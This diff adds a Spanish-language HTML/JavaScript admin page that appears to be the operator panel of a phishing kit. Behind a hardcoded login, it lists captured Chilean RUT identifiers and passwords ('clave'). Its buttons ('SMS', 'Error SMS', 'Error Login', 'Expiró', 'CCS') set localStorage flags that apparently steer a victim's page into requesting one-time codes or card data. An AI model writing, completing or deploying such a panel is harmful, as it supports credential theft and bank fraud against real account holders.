@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Panel con Login Persistente</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      color: #fff;
+    }
+
+    h1 {
+      text-align: center;
+      color: #00ff00;
+      margin: 30px 0 10px;
+      font-size: 32px;
+      font-weight: 400;
+    }
+
+    .error-login {
+      text-align: center;
+      color: red;
+      font-weight: bold;
+      margin-bottom: 10px;
+      display: none;
+    }
+
+    .login-form {
+      width: 100%;
+      max-width: 300px;
+      margin: 0 auto;
+      padding: 30px;
+      background-color: #111;
+      border: 1px solid #333;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+      color: #00ff00;
+    }
+
+    .login-form input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border-radius: 6px;
+      border: 1px solid #00ff00;
+      font-size: 14px;
+      background-color: #000;
+      color: #00ff00;
+    }
+
+    .login-form button {
+      width: 100%;
+      padding: 10px;
+      background-color: #00aa00;
+      color: black;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .login-form button:hover {
+      background-color: #00ff00;
+    }
+
+    .contenedor-total {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .panel-rectangular {
+      width: 95%;
+      max-width: 1400px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 30px 80px;
+      border: 1px solid #00ff00;
+      border-radius: 12px;
+      background-color: #111;
+      margin-top: 30px;
+      color: #fff;
+    }
+
+    .info-horizontal {
+      display: flex;
+      flex: 1;
+      justify-content: flex-start;
+      align-items: center;
+      font-weight: bold;
+      font-size: 16px;
+      gap: 180px;
+      margin-left: -40px;
+    }
+
+    .botones-grid {
+      display: grid;
+      grid-template-columns: repeat(2, auto);
+      gap: 10px;
+    }
+
+    .input-button {
+      padding: 6px 12px;
+      font-size: 14px;
+      background-color: #006600;
+      color: #fff;
+      border: 1px solid #00ff00;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .input-button:hover {
+      background-color: #00ff00;
+      color: #000;
+    }
+
+    .delete-button {
+      background-color: #990000;
+      border-color: red;
+      color: white;
+    }
+
+    .delete-button:hover {
+      background-color: red;
+      color: #000;
+    }
+
+    #panelContainer {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+    }
+  </style>
+</head>
+<body>
+  <h1>Panel</h1>
+  <div id="errorMsg" class="error-login">Error login</div>
+  <div id="loginForm" class="login-form">
+    <input type="text" id="usuarioInput" placeholder="Usuario">
+    <input type="password" id="contrasenaInput" placeholder="Contraseña">
+    <button onclick="verificarLogin()">Iniciar sesión</button>
+  </div>
+  <div class="contenedor-total" id="panelContainer"></div>
+
+  <script>
+    const USUARIO_CORRECTO = "usuario";
+    const CONTRASENA_CORRECTA = "contraseña";
+
+    function verificarLogin() {
+      const usuario = document.getElementById("usuarioInput").value.trim();
+      const contrasena = document.getElementById("contrasenaInput").value.trim();
+
+      if (usuario === USUARIO_CORRECTO && contrasena === CONTRASENA_CORRECTA) {
+        guardarNuevoUsuario(usuario, contrasena);
+        localStorage.setItem("sesionIniciada", "true");
+        mostrarTodosUsuarios();
+        document.getElementById("loginForm").style.display = "none";
+        document.getElementById("errorMsg").style.display = "none";
+      } else {
+        document.getElementById("errorMsg").style.display = "block";
+      }
+    }
+
+    function guardarNuevoUsuario(rut, clave) {
+      let usuarios = JSON.parse(localStorage.getItem("usuarios")) || [];
+
+      const index = usuarios.findIndex(u => u.rut === rut);
+
+      if (index !== -1) {
+        usuarios[index].clave = clave;
+        usuarios[index].expulsado = false;
+      } else {
+        usuarios.push({ rut, clave, sms: "-", expulsado: false });
+      }
+
+      localStorage.setItem("usuarios", JSON.stringify(usuarios));
+    }
+
+    function mostrarTodosUsuarios() {
+      const panel = document.getElementById("panelContainer");
+      panel.style.display = "flex";
+      panel.innerHTML = "";
+
+      let usuarios = JSON.parse(localStorage.getItem("usuarios")) || [];
+
+      usuarios.forEach((usuario, index) => {
+        const divUser = document.createElement("div");
+        divUser.className = "panel-rectangular";
+
+        divUser.innerHTML = `
+          <div class="info-horizontal">
+            <div>RUT: ${usuario.rut}</div>
+            <div>Clave: ${usuario.clave}</div>
+            <div id="displaySMS-${index}">SMS: ${usuario.sms || "-"}</div>
+          </div>
+          <div class="botones-grid">
+            <button class="input-button" onclick="actualizarSMS(${index}, 'Error Login')">Error Login</button>
+            <button class="input-button" onclick="actualizarSMS(${index}, 'SMS')">SMS</button>
+            <button class="input-button" onclick="actualizarSMS(${index}, 'Expiró')">Expiró</button>
+            <button class="input-button" onclick="actualizarSMS(${index}, 'Error SMS')">Error SMS</button>
+            <button class="input-button" onclick="actualizarSMS(${index}, 'CCS')">CCS</button>
+            <button class="input-button delete-button" onclick="borrarUsuario(${index})">Delete</button>
+          </div>
+        `;
+
+        panel.appendChild(divUser);
+      });
+    }
+    function actualizarSMS(indice, mensaje) {
+      let usuarios = JSON.parse(localStorage.getItem("usuarios")) || [];
+
+      if (mensaje === "Error Login") {
+        usuarios[indice].expulsado = true;
+      } else if (mensaje === "SMS" || mensaje === "Error SMS") {
+        const rut = usuarios[indice].rut;
+        localStorage.setItem("esperandoSMS", rut);
+        localStorage.setItem("rutParaSMS", rut);
+
+        if (mensaje === "Error SMS") {
+          localStorage.setItem("errorSMS", "true");
+        }
+      } else {
+        usuarios[indice].sms = mensaje;
+      }
+
+      localStorage.setItem("usuarios", JSON.stringify(usuarios));
+      mostrarTodosUsuarios();
+    }
+
+    function borrarUsuario(indice) {
+      let usuarios = JSON.parse(localStorage.getItem("usuarios")) || [];
+      usuarios.splice(indice, 1);
+      localStorage.setItem("usuarios", JSON.stringify(usuarios));
+      mostrarTodosUsuarios();
+    }
+
+    window.onload = function () {
+      const sesion = localStorage.getItem("sesionIniciada");
+      if (sesion === "true") {
+        mostrarTodosUsuarios();
+        document.getElementById("loginForm").style.display = "none";
+        document.getElementById("errorMsg").style.display = "none";
+      }
+    };
+
+    window.addEventListener("storage", function (event) {
+      if (event.key === "usuarios") {
+        mostrarTodosUsuarios();
+      }
+    });
+  </script>
+</body>
+</html>
